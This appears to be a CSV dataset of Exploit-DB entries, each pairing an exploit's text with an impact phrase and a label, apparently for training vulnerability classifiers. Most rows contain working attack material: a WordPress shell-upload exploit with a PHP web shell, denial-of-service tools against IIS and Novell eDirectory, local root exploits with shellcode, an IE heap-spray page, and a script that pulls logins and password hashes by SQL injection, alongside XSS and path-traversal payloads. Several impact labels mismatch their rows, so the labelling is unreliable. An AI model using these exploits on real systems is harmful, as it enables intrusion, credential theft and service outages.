36478,"WordPress Plugin InBoundio Marketing 1.0 - Arbitrary File Upload <?php ########################################### #-----------------------------------------# #[ 0-DAY Aint DIE | No Priv8 | KedAns-Dz ]# #-----------------------------------------# #     *----------------------------*      # #  K  |....##...##..####...####....|  .   # #  h  |....#...#........#..#...#...|  A   # #  a  |....#..#.........#..#....#..|  N   # #  l  |....###........##...#.....#.|  S   # #  E  |....#.#..........#..#....#..|  e   # #  D  |....#..#.........#..#...#...|  u   # #  .  |....##..##...####...####....|  r   # #     *----------------------------*      # #-----------------------------------------# #[ Copyright (c) 2015 | Dz Offenders Cr3w]# #-----------------------------------------# ########################################### # >>    D_x . Made In Algeria . x_Z    << # ########################################### # # [>] Title : WordPress plugin (InBoundio Marketing) Shell Upload Vulnerability # # [>] Author : KedAns-Dz # [+] E-mail : ked-h (@hotmail.com) # [+] FaCeb0ok : fb.me/K3d.Dz # [+] TwiTter : @kedans # # [#] Platform : PHP / WebApp # [+] Cat/Tag : File Upload / Code Exec # # [<] <3 <3 Greetings t0 Palestine <3 <3 # [!] Vendor : http://www.inboundio.com # ########################################### # # [!] Description : # # Wordpress plugin InBoundio Marketing v1.0 is suffer from File/Shell Upload Vulnerability # remote attacker can upload file/shell/backdoor and exec commands. # #### # Lines (6... to 20) : csv_uploader.php #### # # ExpLO!T :  # -------  $postData = array(); $postData[ 'file' ] = ""@k3dz.php""; #Shell_2_Exec ;)  $dz = curl_init(); curl_setopt($dz, CURLOPT_URL, ""http://[Target]/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php""); curl_setopt($dz, CURLOPT_USERAGENT, ""Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)""); curl_setopt($dz, CURLOPT_POST, 1); curl_setopt($dz, CURLOPT_POSTFIELDS, $postData ); curl_setopt($dz, CURLOPT_TIMEOUT, 0); $buf = curl_exec ($dz); curl_close($dz); unset($dz); echo $buf;  /* [!] creat your shell file =>  _ k3dz.php :   <?php system($_GET['dz']); ?>   [>] Post the exploit  [+] Find you'r backdoor : ../inboundio-marketing/admin/partials/uploaded_csv/k3dz.php?dz=[ CMD ] [+] Or upload what you whant ^_^ ...  */  #### #  <! THE END ^_* ! , Good Luck all <3 | 0-DAY Aint DIE ^_^ !> #  Hassi Messaoud (30500) , 1850 city/hood si' elHaouass .<3 #--------------------------------------------------------------- # Greetings to my Homies : Meztol-Dz , Caddy-Dz , Kalashinkov3 ,  # Chevr0sky , Mennouchi.Islem , KinG Of PiraTeS , TrOoN , T0xic, # & Jago-dz , Over-X , Kha&miX , Ev!LsCr!pT_Dz , Barbaros-DZ , & # & KnocKout , Angel Injection , The Black Divels , kaMtiEz  , & # & Evil-Dz , Elite_Trojan , MalikPc , Marvel-Dz , Shinobi-Dz, & # & Keystr0ke , JF , r0073r , CroSs , Inj3ct0r/Milw0rm 1337day &  # PacketStormSecurity * Metasploit * OWASP * OSVDB * CVE Mitre ; ####  # REF : http://k3dsec.blogspot.com/2015/03/wordpress-plugin-inboundio-marketing.html  ?>",upload fileshellbackdoor and exec commands,1
28949,"bitweaver 1.x - '/newsletters/edition.php?tk' SQL Injection source: https://www.securityfocus.com/bid/20988/info  Bitweaver is prone to multiple input-validation vulnerabilities because the application fails to sufficiently sanitize user-supplied input. These issues include multiple HTML-injection issues and multiple SQL-injection issues.   A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, or even exploit vulnerabilities in the underlying database implementation. Other attacks are also possible.  Bitweaver 1.3.1 and prior versions are vulnerable to these issues.  http://www.example.com/newsletters/edition.php?tk=[SQL]&find=1&search=suchen","compromise the application, access or modify data, steal cookie-based authentication credentials, or even exploit vulnerabilities in the underlying database implementation",1
36007,"AzeoTech DaqFactory - Denial of Service source: https://www.securityfocus.com/bid/48955/info  AzeoTech DAQFactory is prone to a denial-of-service vulnerability.  Attackers can exploit this issue to cause the application to crash, denying service to legitimate users.  Versions prior to DAQFactory 5.85 are vulnerable.    The following exploit requests are available:  preamble: ""\x01\x00\x09\x00CPassword\x00""  reboot: ""\x01\x00\x0f\x00CCommandGeneric\x01\x00\x00\x00\x04\x00\x00\x00""  shutdown: ""\x01\x00\x0f\x00CCommandGeneric\x01\x00\x00\x00\x06\x00\x00\x00""",denial-of-service,1
4278,"Pixlie 1.7 - 'pixlie.php?root' Remote File Disclosure Pixlie 1.7 Remote File Disclosure Vulnerability -----------------------------------------------------------------------  Script : Pixlie 1.7  Version : 1.7  Site : http://www.pixlie.de/download.php  Founder : Rizgar  Contact : rizgar@linuxmail.org and irc.gigachat.net #kurdhack  Thanks : Kurdish Hackers Clan(Anti Fashist Group :P), PH(HERO) , ColdHackers(nice boys)  d0rk : ""Pixlie - die kostenlose Bildergalerie""  -----------------------------------------------------------------------  look at pixlie.php   //$root = ""/home/www/IhrBenutzer/html"";    PoC :  http://www.example.com/pixlie.php?root=../../../../../etc/passwd%00  # milw0rm.com [2007-08-10]",code execution,1
22670,"Microsoft IIS 5.0 - WebDAV PROPFIND / SEARCH Method Denial of Service /* source: https://www.securityfocus.com/bid/7735/info  Microsoft Internet Information Services has been reported vulnerable to a denial of service.  When WebDAV receives excessively long requests to the 'PROPFIND' or 'SEARCH' variables, the IIS service will fail. All current web, FTP, and email sessions will be terminated.  IIS will automatically restart and normal service will resume.  ** It has been reported that if a WebDAV request with a certain number of bytes is received, the Inetinfo service will remain alive but cease serving requests. This will cause the IIS server to stop serving requests until the service is manually restarted. */  /* IIS eXploit. by velan. Greetz to: Shashank Pandey a.k.a +(Neo1)+ Bid:  7735 */  #define ERROR -1 #define OK 1  #ifdef HAVE_CONFIG_H #include <config.h> #endif  #include <stdio.h> #include <stdlib.h> #include <sys/socket.h> #include <sys/types.h> #include <netinet/in.h> #include <arpa/inet.h> #include <string.h>  int check_for_iis(); void screw_iis(); void usage();  char IP[15];  int main(int argc, char *argv[]) { /*  cout << ""Hello, World!"" << endl;  */     if(argc !=2)    {       usage();  exit(0);    }     printf(""IIS eXploit. by velan. Greetz to: Shashank Pandey a.k.a +(Neo1)+\n"");     strcpy(IP, argv[1]);     if(check_for_iis() != OK)    {       printf(""Sorry, BAD LUCK! \n"");    exit(0);    }     screw_iis();    return EXIT_SUCCESS; }  int check_for_iis() {   int sck, flag = 1;   struct sockaddr_in sin;   char req[50];    sck = socket(AF_INET, SOCK_STREAM, 0);   if(sck == ERROR)   {     perror(""Socket error "");      exit(0);   }    sin.sin_port = htons(80);   sin.sin_family = AF_INET;   sin.sin_addr.s_addr = inet_addr(IP);    if ((connect(sck, (struct sockaddr *) &sin, sizeof(sin))) == -1)   {     perror(""Connect Error "");     exit(0);   }    strcpy(req, ""GET / HTTP/1.0\r\n\n"");   send(sck, req, sizeof(req), 0);   recv(sck, req, sizeof(req), 0);    if (strstr(req,""IIS"") == NULL)   {     printf("" Not an IIS server! \n"");     flag = 0;   }    sprintf(req,""SEARCH / HTTP/1.0\r\n\n"",40);   send(sck, req, sizeof(req), 0);   recv(sck, req, sizeof(req), 0);    if (strstr(req,""HTTP/1.1 411 Length Required"") == NULL)   {     printf(""METHOD SEARCH NOT ALLOWED. \n"");     flag = 0;   }    return(flag); }    void screw_iis() {   int sck, flag = 1;   struct sockaddr_in sin;   char junk[100];   char buffer[65535] ="""";   char request[80000];   char content[] =            ""<?xml version=\""1.0\""?>\r\n""            ""<g:searchrequest xmlns:g=\""DAV:\"">\r\n""            ""<g:sql>\r\n""            ""Select \""DAV:displayname\"" from scope()\r\n""            ""</g:sql>\r\n""            ""</g:searchrequest>\r\n"";     sck = socket(AF_INET, SOCK_STREAM, 0);   if(sck == ERROR)   {     perror(""Socket error "");      exit(0);   }    sin.sin_port = htons(80);   sin.sin_family = AF_INET;   sin.sin_addr.s_addr = inet_addr(IP);    if ((connect(sck, (struct sockaddr *) &sin, sizeof(sin))) == -1)   {     perror(""Connect Error "");     exit(0);   }    buffer[sizeof(buffer)]=0x00;    memset(buffer,'S',sizeof(buffer));   memset(request,0,sizeof(request));   memset(junk,0,sizeof(junk));    sprintf(request,""SEARCH /%s HTTP/1.1\r\nHost: %s\r\nContent-type: text/xml\r\nCon tent-Length: "",buffer,IP);   sprintf(request,""%s%d\r\n\r\n"",request,strlen(content));    printf(""\r\nScrewing the server... \n"");    send(sck,request,strlen(request),0);    send(sck,content,strlen(content),0);    recv(sck,junk,sizeof(junk),0);    if(junk[0]==0x00)   {      printf(""Server is Screwed! \r\n"");   }   else   {       printf(""BAD LUCK. Patched.\n"");   } }    void usage() {   printf(""IIS eXploit. by velan. Greetz to: Shashank Pandey a.k.a +(Neo1)+\n"");   printf(""Usage\r\n"");   printf(""Screw_IIS <victim IP>\n""); }",denial of service,1
45784,"Voovi Social Networking Script 1.0 - 'user' SQL Injection  Exploit Title: Voovi Social Networking Script 1.0 - 'user' SQL Injection # Dork: N/A # Date: 2018-11-04 # Exploit Author: Ihsan Sencan # Vendor Homepage: http://www.adminspoint.com/voovi/index.php # Software Link: https://netix.dl.sourceforge.net/project/voovi/voovi%20a%20social%20networking%20script.zip # Version: 1.0 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A  # POC:  # 1) # http://localhost/[PATH]/? #  POST /[PATH]/? HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 165 user=1' UNION SELECT NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL-- -&password=&action=login&submit= HTTP/1.1 200 OK Date: Sun, 04 Nov 2018 14:22:41 GMT Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30 X-Powered-By: PHP/5.6.30 Set-Cookie: PHPSESSID=v8nhfofpnrt6a4clfqbrp7aa00; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Content-Length: 5987 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8",information disclosure,1
20450,"Trlinux Postaci Webmail 1.1.3 - Password Disclosure source: https://www.securityfocus.com/bid/2029/info  Postaci Webmail is a database-driven web e-mail system. PostACI contains a vulnerability in its default configuration that may allow a remote attacker to gain access to the underlying database.  Webmail stores database username and password information in a file called global.inc. This file is world-readable and stored in a directory accessible by a web browser over the internet. As a result, an attacker can retrieve the global.inc file with a web browser on a typical system (default configuration). Once obtained, the attacker may be able to access the systems database.  Successful exploitation will lead to the attacker gaining unauthorized access to the database.  Depending on the database and system type, this may lead to a compromise of interactive access on the host running Webmail and the database.   http://target/includes/global.inc",gain access to the underlying database,1
37522,WordPress Plugin chenpress - Arbitrary File Upload source: https://www.securityfocus.com/bid/54635/info  The chenpress plugin for WordPress is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.  An attacker can exploit this vulnerability to upload arbitrary code and run it in the context of the web server process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.   http://www.example.com/wp-content/plugins/chenpress/FCKeditor/editor/filemanager/browser/mcpuk/browser.html,upload arbitrary files,1
29800,"Microsoft Internet Explorer 7 - HTML Denial of Service source: https://www.securityfocus.com/bid/23178/info  Microsoft Internet Explorer is prone to a denial-of-service vulnerability because the application fails to handle exceptional conditions.  This issue is triggered when an attacker entices a victim user to visit a malicious website.  Remote attackers may exploit this issue to crash Internet Explorer, effectively denying service to legitimate users.  This issue affects Internet Explorer version 7.   # usr/bin/python  print ""-------------------------------------------------------------------------"" print "" Internet Explorer 7.0.5730.11 Denial of Service"" print "" author: shinnai"" print "" mail: shinnai[at]autistici[dot]org"" print "" site: http://shinnai.altervista.org\n"" print "" For convenience I post up a script in python that create a .html file"" print "" You can open it locally, upload and browse it or directely browse here:\n"" print "" http://www.shinnai.altervista.org/ie_dos.html\n"" print "" About 60 seconds and IE7 stops to answer :)"" print ""-------------------------------------------------------------------------""  tagHtml = ""<html>"" tagHtmlC = ""</html>"" tagHead = ""<head>"" tagHeadC = ""</head>"" tagTitle = ""<title>"" tagTitleC = ""</title>""  buff= ""\x90"" * 80000  boom = tagHtml + buff  + tagHead + buff + tagTitle + buff + tagTitleC + tagHeadC + tagHtmlC  try:    fileOut = open('ie_dos.html','w')    fileOut.write(boom)    fileOut.close()    print ""\nFILE CREATED!\n'NJOY IT...\n"" except:    print ""\nUNABLE TO CREATE FILE!\n""",denial-of-service,1
22923,"Tolis Group BRU 17.0 - Local Privilege Escalation (1) // source: https://www.securityfocus.com/bid/8215/info  It has been reported that BRU may not properly parse commandline arguments, potentially leading to at least two vectors of exploitation. It may be possible for local attackers to conduct format string-based attacks as well as buffer overflow-based attacks.  It should be noted that although BRU does not ship with the suid bit set by default, documentation within the software may instruct users to enable it.  /** EST BRU(TM) Backup and Restore Utility Local Root Exploit  **  ** By: Dvdman@l33tsecurity.com  **  ** Simple Stack overflow Wont say any more :P  **  ** Linux & FreeBsd Targets  **  ** Greetz: sam,flatline,v0id,#!l33tsecurity@efnet,KF,b0iler,schlumpf,kokanin,DSR  **  ** Public Release  ** L33tsecurity 2003; irc.secsup.org #l33tsecurity  **/  #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #include <sys/errno.h>  #define FUN ""./bru""  char shellcode[] =     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""      /* SETUID(0) SHELLCODE LINUX */     ""\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc\xfc""     ""\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f""     ""\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d""     ""\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"";  unsigned long sp(void) {            __asm__(""movl %esp,%eax""); }  int main(int argc, char **argv) {      char buffer[9000];     int x,target;       char    *env[2];     char    *args[24];      unsigned long ret = 0xbffffffa - strlen(shellcode) - strlen(FUN);       int *ptr = (int *)(buffer);     if (argc != 2) {        usage();        exit(0);        }              target = atoi(argv[1]);     if (target == 0) {     for (x=0; x<9000 ; x+=4)       *ptr++ = (ret + 1);    }     if (target == 1) {      for (x=0; x<3500 ; x+=4)           *ptr++ = 0xbfbffe48;    }          /* put in env */       env[0] = shellcode;          env[1] = NULL;       args[0] = FUN;     args[1] = buffer;     args[2] = NULL;       execve (args[0], args, env);     perror (""execve"");         }          int usage() { printf(""EST BRU(TM)local root exploit\n""); printf(""By: Dvdman@l33tsecurity.com\n""); printf(""Usage: ./ex_bru target\n""); printf(""TARGET LIST:\n""); printf(""0. LINUX\n1. FREEBSD\n""); return 0; }",at least two vectors of exploitation,0
30654,ActiveKB NX 2.6 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/26027/info  ActiveKB NX is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal potentially sensitive information and launch other attacks.  This issue affects ActiveKB NX 2.6; other versions may also be vulnerable.   http://www.example.com/ActiveKB/page?=XSS,execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
23917,"Panda ActiveScan 5.0 - 'ascontrol.dll' Remote Heap Overflow source: https://www.securityfocus.com/bid/10065/info  It has been reported that Panda ActiveScan may be prone to a remote heap overflow vulnerability that may allow an attacker to cause a denial of service condition in Internet Explorer or leverage the issue to execute arbitrary code.  The issue is reported to exist in the 'ascontrol.dll' file, specifically the 'Internacional' property of the 'ReportHebrew' object is identified as vulnerable.  Panda ActiveScan 5.0 has been reported to be prone to this issue.   <script language=vbscript> dim mymy Set mymy = CreateObject(""ASControl.ReportHebrew.1"" )  a=""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" mymy.Internacional a </script>",cause a denial of service condition in Internet Explorer or leverage the issue to execute arbitrary code,1
33581,Hybserv2 - ':help' Denial of Service source: https://www.securityfocus.com/bid/38006/info  Hybserv2 is prone to a denial-of-service vulnerability.  Attackers can exploit this issue to deny service to legitimate users.  Hybserv2 1.9.4 is vulnerable; other versions may also be affected.   The following example command is available:  PRIVMSG memoserv :help \t,denial-of-service,1
5344,"Novel eDirectory HTTP - Denial of Service #!/usr/bin/python # Novel eDirectory HTTP DOS # Discovered and coded by Mati Aharoni # muts..at..offensive-security.com # http://www.offensive-security.com/0day/novel-edir.py.txt  import socket import os import sys from time import sleep  biff=""<""*2048 print ""[*] Payload sent ""+ str(len(buff)) expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM ) expl.connect ( ( sys.argv[1], 8028 ) ) expl.send ( 'HEAD '+biff+' HTTP/1.1\r\nHost: 192.168.1.10:20\r\nUser-Agent: Mozilla/4.0 (Linux 2.6.21.5) Java/1.5.0_02\r\n\r\n') data=expl.recv(1024) print data expl.close()  # milw0rm.com [2008-04-02]",denial of service,1
1402,"SCO OpenServer 5.0.7 - 'termsh' Local Privilege Escalation /* SCO Openserver 5.0.7 termsh exploit  * ===================================  * 'termsh' is a program to view or modify an existing terminal entry on  * SCO Openserver. A stack based overflow exists in the handling of command  * line arguements, namely the [-o oadir] arguement. It is installed setgid  * auth in a default SCO Openserver 5.0.7 install. An attacker may use this  * flaw to gain write access to /etc/passwd or /etc/shadow  allowing for  * local root compromise.  *  * Example use.  * $ id  * uid=200(user) gid=50(group) groups=50(group)  * $ uname -a  * SCO_SV scosysv 3.2 5.0.7 i386  * $ gcc prdelka-vs-SCO-termshx.c -o prdelka-vs-SCO-termshx  * $ ./prdelka-vs-SCO-termshx /opt/K/SCO/Unix/5.0.7Hw/usr/lib/sysadm/termsh  * [ SCO Openserver 5.0.7 termsh local privilege escalation exploit  * $ id  * uid=200(user) gid=50(group) egid=21(auth) groups=50(group)  *  * - prdelka  */ #include <stdio.h> #include <stdlib.h>  char shellcode[]=""\x90\x90\x90\x90\x90\x90\x90\x90""                  ""\x68\xff\xf8\xff\x3c\x6a\x65\x89""                  ""\xe6\xf7\x56\x04\xf6\x16\x31\xc0""                  ""\x50\x68""""/ksh""""\x68""""/bin""""\x89""                  ""\xe3\x50\x50\x53\xb0\x3b\xff\xd6"";  int main(int argc,char* argv[]) {         char* buffer;         char* arg = ""-o"";         char *env[] = {""HISTORY=/dev/null"",NULL};         long eip,ptr;         int i;         printf(""[ SCO Openserver 5.0.7 termsh local privilege escalation exploit\n"");         if(argc < 2)         {                 printf(""[ Error  : [path]\n[ Example: %s /opt/K/SCO/Unix/5.0.7Hw/usr/lib/sysadm/termsh\n"",argv[0]);                 exit(0);         }         eip = 0xa2080853;         buffer = malloc(7449 + strlen(shellcode));         memset(buffer,'\x00',7449 + strlen(shellcode));         ptr = (long)buffer + strlen(shellcode);         strncpy(buffer,shellcode,strlen(shellcode));         for(i = 1;i <= 1862;i++)         {                 memcpy((char*)ptr,(char*)&eip,4);                 ptr = ptr + 4;         }         execle(argv[1],argv[1],arg,buffer,NULL,env);         exit(0); }  // milw0rm.com [2006-01-03]",denial of service,1
29177,MMGallery 1.55 - 'Thumbs.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/21281/info  The mmgallery script is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Version 1.55 is vulnerable to this issue; other versions may also be affected.  http://www.example.com/thumbs.php?page='>,have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site,1
31867,"CMS Easyway - 'mid' SQL Injection source: https://www.securityfocus.com/bid/29461/info  CMS Easyway is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   <?php ini_set(""max_execution_time"",0); print_r(' ############################################################### # #           EasyWay CMS - SQL Injection Exploit      #                                                              #      Vulnerability discovered by: Lidloses_Auge              #      Exploit coded by:            Lidloses_Auge #      Greetz to:                   -=Player=- , Suicide, g4ms3, enco, #                                   GPM, Free-Hack #      Date:                        30.05.2008 #      Developer:		    http://www.ta-edv.de/index.php?lg=de&css=1&mid=320&art=1 # ############################################################### #                                                              #      Dork:  inurl:""index.php?css=mid=art="" #      Admin Panel: [Target]/cms/ #      Usage: php '.$argv[0].' [Target] [Userid] #      Example for ""http://www.site.com/index.php?css=1&mid=100&art=1"" #      => php '.$argv[0].' http://www.site.com 1 #                                                              ############################################################### '); if ($argc == 3) { echo ""\nExploiting in progress:""; $url = $argv[1]; $source = file_get_contents($url.'/index.php?mid=null+order+by+100/*'); $errorcount = substr_count($source,'not a valid MySQL'); $sql = '/index.php?mid=null+union+select+'; for ($i = 25; $i>=1; $i--) {    $source = file_get_contents($url.'/index.php?mid=null+order+by+'.$i.'/*');    if (substr_count($source,'not a valid MySQL')!=$errorcount) {       $errorcount2 = $i;       $i = 1;    } } for ($j=1; $j<$errorcount2; $j++) {    $sql = $sql.'concat(0x3a3a3a3a3a,login,0x3a3a313a3a,passwort,0x3a3a323a3a),';    } $sql = $sql.'concat(0x3a3a3a3a3a,login,0x3a3a313a3a,passwort,0x3a3a323a3a)+from+cms_benutzer+where+id='.$argv[2].'/*'; $source = file_get_contents($url.$sql); echo ""\n""; if (strpos($source,'::::')!=0) {    echo 'User: '.substr($source,strpos($source,'::::')+5,strpos($source,'::1::')-strpos($source,'::::')-5).""\n"";    echo 'Hash: '.substr($source,strpos($source,'::1::')+5,strpos($source,'::2::')-strpos($source,'::1::')-5).""\n""; } else {    echo 'Exploit failed!'.""\n""; } } else { echo ""\nNot enough arguments!\n""; } ?>","compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database",1
10210,"Microsoft Internet Explorer 6/7 - CSS Handling Denial of Service <!-- securitylab.ir K4mr4n_st (at) yahoo (dot) com [email concealed] --> <!DOCTYPE HTML PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd""> <HTML xmlns=""http://www.w3.org/1999/xhtml""> <HEAD> <script> function load(){ var e; e=document.getElementsByTagName(""STYLE"")[0]; e.outerHTML=""1""; } </script> <STYLE type=""text/css""> body{ overflow: scroll; margin: 0; } </style>  <SCRIPT language=""javascript""> var shellcode = unescape(""%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120%u49EB%u348B%u018B%u31EEu99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB0%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%u 7E68%uE2D8%u6873%uFE98%u0E8A%uFF57%u63E7%u6C61%u0063""); var bigblock = unescape(""%u9090%u9090""); var headersize = 20; var slackspace = headersize+shellcode.length; while (bigblock.length<slackspace) bigblock+=bigblock; fillblock = bigblock.substring(0, slackspace); block = bigblock.substring(0, bigblock.length-slackspace); while(block.length+slackspace<0x40000) block = block+block+fillblock; memory = new Array(); for (x=0; x<4000; x++) memory[x] = block + shellcode; </script>  </HEAD> <BODY onload=""load()""> </BODY> </HTML>",denial of service,1
28298,"Yahoo! Messenger 7.0/7.5 - Remote Search String Arbitrary Browser Navigation source: https://www.securityfocus.com/bid/19211/info  Yahoo! Messenger is prone to a browser-navigation vulnerability that may permit a remote attacker to open a browser window on the victim user's computer to an arbitrary page.  This issue occurs because the application fails to sanitize malicious messages.  An attacker may be able to exploit this issue to execute a web browser and load an arbitrary web page. This may lead to other attacks.  This issue affects version 7.5.0.814; other versions may also be vulnerable.  The following examples are sufficient to trigger this issue:  :+)-(%/?#()(=(/;_@#~$(@;+?/(?#@@*-)?@+#@;?(msg:---------------------------------------------<embed onload=window.open('http:\\\\google.com/')>helomsg  :+)-(%/?#()(=(/;_@#~$(@;+?/(?#@@*-)?@+#@;?(msg:---------------------------------------------<embed onload=window.open('http:\\\\google.com/')>helomsg :+)-(%/?#()(=(/;_@#~$(@;+?/(?#@@*-)?@+#@;?(  Note: ""helomsg :"" this space must be created with alt+0160 and this ""s: "" with a space.",open a browser window on the victim user's computer to an arbitrary page,1
26108,Dvbbs 7.1/8.2 - 'dispuser.asp?name' Cross-Site Scripting source: https://www.securityfocus.com/bid/14498/info   DVBBS is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.   An attacker may leverage these issues to execute arbitrary code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/dispuser.asp?name=Walltrapass[XSS-CODE],execute arbitrary code in the browser of an unsuspecting user in the context of the affected site,1
43023,"TP-Link TL-MR3220 - Cross-Site Scripting # Exploit Title: Vulnerability Xss - TP-LINK TL-MR3220 # Date: 12/10/2017 # Exploit Author: Thiago ""THX"" Sena # Vendor Homepage: http://www.tp-link.com.br # Version: TL-MR3220 # Tested on: Windows 10 # CVE : CVE-2017-15291  Vulnerabilty: Cross-site scripting (XSS) in TP-LINK TL-MR3220 cve: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15291 ---------------------------------------------------------------  PoC:   0x01 - First you go to ( http://IP:PORT/ )  0x02 - In the 'Wireless MAC Filtering' tab.   0x03 - Will add a new MAC Address.  0x04 - In 'Description' it will put the script ( <script>alert('XSS')</script> ) and complete the registration.   0x05 - Xss Vulnerability  --------------------------------------------------------------",code execution,1
